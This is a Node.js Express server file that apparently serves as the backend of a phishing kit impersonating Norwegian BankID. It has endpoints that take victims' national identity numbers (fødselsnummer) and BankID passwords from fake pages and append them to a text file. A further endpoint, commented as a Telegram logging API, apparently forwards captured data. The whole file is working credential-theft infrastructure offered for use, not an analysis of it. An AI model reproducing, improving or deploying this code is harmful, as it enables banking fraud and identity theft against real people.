const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.set('trust proxy', 1); // Coolify / reverse proxy setter x-forwarded-for
const port = Number(process.env.PORT) || 3000;
const logDataHandler = require('./api/log_data');

// Middleware to parse URL-encoded data (form submissions)
app.use(express.urlencoded({ extended: true }));
// Middleware to parse JSON data
app.use(express.json());

// Define the path for userdata.txt in the project root (where server.js is)
const dataFilePath = path.join(__dirname, 'userdata.txt');

// Endpoint for page2.html (Fødselsnummer)
app.post('/save-fnr', (req, res) => {
    const fnr = req.body.fnr;
    if (fnr) {
        const dataToSave = `Timestamp: ${new Date().toISOString()}\nPage: page2.html\nFødselsnummer: ${fnr}\n------------------------------------\n`;
        fs.appendFile(dataFilePath, dataToSave, (err) => {
            if (err) {
                console.error("Failed to save FNR:", err);
                return res.status(500).send('Error saving FNR data.');
            }
            console.log("FNR saved:", fnr);
            res.status(200).send('FNR received successfully.');
        });
    } else {
        res.status(400).send('FNR not provided.');
    }
});

// Endpoint for page4.html (BankID Password)
app.post('/save-password', (req, res) => {
    const password = req.body.bankid_password;
    if (password) {
        const dataToSave = `Timestamp: ${new Date().toISOString()}\nPage: page4.html\nBankID Password Attempt: ${password}\n------------------------------------\n`;
        fs.appendFile(dataFilePath, dataToSave, (err) => {
            if (err) {
                console.error("Failed to save password attempt:", err);
                return res.status(500).send('Error saving password data.');
            }
            console.log("Password attempt saved.");
            res.status(200).send('Password attempt received successfully.');
        });
    } else {
        res.status(400).send('Password not provided.');
    }
});

// Telegram / logging API (brukes av alle page*.html som kaller fetch('/api/log_data'))
app.post('/api/log_data', logDataHandler);

// *** UPDATED PART: Serve static files from the 'public' directory ***
// This assumes server.js is in your project root, and your HTML files are in project-root/public/
app.use(express.static(path.join(__dirname, 'public')));

// Optional: If you want a default route to index.html in the public folder
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});


app.listen(port, () => {
    console.log(`Server listening at http://localhost:${port}`);
    console.log(`Serving static files from the 'public' directory.`);
    console.log(`To test, open your browser to (e.g.):`);
    console.log(`  http://localhost:${port}/page2.html`);
    console.log(`  http://localhost:${port}/page4.html`);
    console.log(`  (Assuming these files exist in your 'public' folder)`);
    console.log(`Data will be saved to: ${dataFilePath}`);
});